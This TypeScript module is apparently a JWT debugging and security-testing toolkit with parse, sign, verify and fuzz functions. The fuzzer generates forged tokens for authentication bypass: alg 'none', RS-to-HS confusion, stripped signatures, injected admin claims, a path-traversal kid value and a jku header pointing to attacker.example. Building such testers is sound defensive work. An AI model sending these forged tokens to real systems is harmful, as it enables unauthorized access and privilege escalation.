import { SignJWT, jwtVerify, importSPKI, decodeProtectedHeader } from "jose";
import { base64UrlToUtf8, utf8ToBase64Url } from "./base64url";

export type JwtAlg = "HS256" | "HS384" | "HS512";

export interface ParsedJwt {
  raw: string;
  headerRaw: string;
  payloadRaw: string;
  signatureRaw: string;
  header: Record<string, unknown>;
  payload: Record<string, unknown>;
  headerError?: string;
  payloadError?: string;
  structureValid: boolean;
}

/** Split + decode a JWT without verifying it. Never throws. */
export function parseJwt(token: string): ParsedJwt {
  const parts = token.trim().split(".");
  const [headerRaw = "", payloadRaw = "", signatureRaw = ""] = parts;
  const structureValid = parts.length === 3 && headerRaw.length > 0 && payloadRaw.length > 0;

  let header: Record<string, unknown> = {};
  let headerError: string | undefined;
  try {
    header = JSON.parse(base64UrlToUtf8(headerRaw));
  } catch {
    headerError = headerRaw ? "Could not decode header" : "Missing header";
  }

  let payload: Record<string, unknown> = {};
  let payloadError: string | undefined;
  try {
    payload = JSON.parse(base64UrlToUtf8(payloadRaw));
  } catch {
    payloadError = payloadRaw ? "Could not decode payload" : "Missing payload";
  }

  return {
    raw: token,
    headerRaw,
    payloadRaw,
    signatureRaw,
    header,
    payload,
    headerError,
    payloadError,
    structureValid,
  };
}

export interface EncodeOptions {
  header: Record<string, unknown>;
  payload: Record<string, unknown>;
  secret: string;
  alg: JwtAlg;
}

/** Build + sign a JWT with an HMAC secret. */
export async function encodeJwt({ header, payload, secret, alg }: EncodeOptions): Promise<string> {
  const key = new TextEncoder().encode(secret);
  const signer = new SignJWT(payload).setProtectedHeader({ ...header, alg });
  return signer.sign(key);
}

export type VerifyResult =
  | { ok: true; payload: Record<string, unknown> }
  | { ok: false; reason: string };

/** Verify signature with an HMAC secret (HS256/384/512). */
export async function verifyHmac(token: string, secret: string): Promise<VerifyResult> {
  try {
    const header = decodeProtectedHeader(token);
    if (!header.alg?.startsWith("HS")) {
      return { ok: false, reason: `Token uses ${header.alg ?? "an unknown"} algorithm, not HMAC. Use the public-key verifier instead.` };
    }
    const key = new TextEncoder().encode(secret);
    const { payload } = await jwtVerify(token, key);
    return { ok: true, payload };
  } catch (err) {
    return { ok: false, reason: err instanceof Error ? err.message : "Verification failed" };
  }
}

/** Verify signature with an RSA/EC public key in SPKI PEM format (RS256/384/512, ES256/384/512). */
export async function verifyAsymmetric(token: string, publicKeyPem: string): Promise<VerifyResult> {
  try {
    const header = decodeProtectedHeader(token);
    const alg = header.alg;
    if (!alg || (!alg.startsWith("RS") && !alg.startsWith("ES") && !alg.startsWith("PS"))) {
      return { ok: false, reason: `Token uses ${alg ?? "an unknown"} algorithm, not RSA/EC. Use the HMAC verifier instead.` };
    }
    const key = await importSPKI(publicKeyPem, alg);
    const { payload } = await jwtVerify(token, key);
    return { ok: true, payload };
  } catch (err) {
    return { ok: false, reason: err instanceof Error ? err.message : "Verification failed" };
  }
}

export interface FuzzMutation {
  id: string;
  name: string;
  category: "algorithm" | "structure" | "payload" | "signature";
  description: string;
  token: string;
  severity: "info" | "warn" | "high";
}

/** Generate a set of well-known JWT attack-vector mutations for security testing. */
export function fuzzJwt(base: string): FuzzMutation[] {
  const parsed = parseJwt(base);
  const mutations: FuzzMutation[] = [];
  const rebuild = (header: Record<string, unknown>, payload: Record<string, unknown>, sig = parsed.signatureRaw) =>
    `${utf8ToBase64Url(JSON.stringify(header))}.${utf8ToBase64Url(JSON.stringify(payload))}.${sig}`;

  // alg: none
  mutations.push({
    id: "alg-none",
    name: 'Algorithm set to "none"',
    category: "algorithm",
    description: "Tests whether the verifier rejects unsigned tokens. A vulnerable server accepts this as fully trusted.",
    token: rebuild({ ...parsed.header, alg: "none" }, parsed.payload, ""),
    severity: "high",
  });
  mutations.push({
    id: "alg-none-case",
    name: 'Algorithm set to "None" / "NONE"',
    category: "algorithm",
    description: "Case-variant of alg:none — catches verifiers that only check the lowercase string.",
    token: rebuild({ ...parsed.header, alg: "NoNe" }, parsed.payload, ""),
    severity: "high",
  });

  // algorithm confusion RS -> HS
  if (typeof parsed.header.alg === "string" && parsed.header.alg.startsWith("RS")) {
    mutations.push({
      id: "alg-confusion",
      name: "RS256 → HS256 confusion",
      category: "algorithm",
      description: "If the server naively reuses its RSA public key as an HMAC secret, this forged token can pass verification.",
      token: rebuild({ ...parsed.header, alg: "HS256" }, parsed.payload),
      severity: "high",
    });
  }

  // empty / stripped signature
  mutations.push({
    id: "empty-sig",
    name: "Empty signature",
    category: "signature",
    description: "Strips the signature entirely while keeping the algorithm declared.",
    token: `${parsed.headerRaw}.${parsed.payloadRaw}.`,
    severity: "high",
  });

  // corrupted signature (bit flip)
  mutations.push({
    id: "corrupt-sig",
    name: "Corrupted signature",
    category: "signature",
    description: "Flips the last character of a valid-looking signature. Confirms the verifier actually checks bytes rather than just length.",
    token: `${parsed.headerRaw}.${parsed.payloadRaw}.${parsed.signatureRaw.slice(0, -1)}${parsed.signatureRaw.slice(-1) === "A" ? "B" : "A"}`,
    severity: "warn",
  });

  // privilege escalation
  const privPayload = { ...parsed.payload, admin: true, role: "admin", isAdmin: true };
  mutations.push({
    id: "priv-esc",
    name: "Privilege escalation payload",
    category: "payload",
    description: "Injects common admin/role claims to check if the app trusts unverified payload fields.",
    token: rebuild(parsed.header, privPayload),
    severity: "warn",
  });

  // expired timestamp bypass
  const now = Math.floor(Date.now() / 1000);
  const expPayload = { ...parsed.payload, exp: now + 60 * 60 * 24 * 365 * 10 };
  mutations.push({
    id: "exp-extend",
    name: "Expiry extended 10 years",
    category: "payload",
    description: "Tests whether an expired or short-lived token can be extended by editing exp without re-signing.",
    token: rebuild(parsed.header, expPayload),
    severity: "info",
  });

  // no exp claim at all
  const noExp = { ...parsed.payload };
  delete (noExp as Record<string, unknown>).exp;
  mutations.push({
    id: "no-exp",
    name: "exp claim removed",
    category: "payload",
    description: "Checks whether the verifier requires an expiration claim or silently accepts tokens without one.",
    token: rebuild(parsed.header, noExp),
    severity: "info",
  });

  // kid injection (path traversal / sql-ish probe)
  mutations.push({
    id: "kid-injection",
    name: "kid header injection",
    category: "structure",
    description: "Injects a path-traversal-like value into the kid header, a known vector when kid is used to look up keys from disk or a database.",
    token: rebuild({ ...parsed.header, kid: "../../../../dev/null" }, parsed.payload),
    severity: "warn",
  });

  // jku / x5u injection
  mutations.push({
    id: "jku-injection",
    name: "jku header pointing to attacker host",
    category: "structure",
    description: "Sets jku to an external URL to test if the verifier fetches and trusts a remote JWK set without an allowlist.",
    token: rebuild({ ...parsed.header, jku: "https://attacker.example/jwks.json" }, parsed.payload),
    severity: "high",
  });

  return mutations;
}

export function sampleHeader(alg: JwtAlg = "HS256"): Record<string, unknown> {
  return { alg, typ: "JWT" };
}

export function samplePayload(): Record<string, unknown> {
  const now = Math.floor(Date.now() / 1000);
  return {
    sub: "1234567890",
    name: "Ada Lovelace",
    iat: now,
    exp: now + 3600,
  };
}
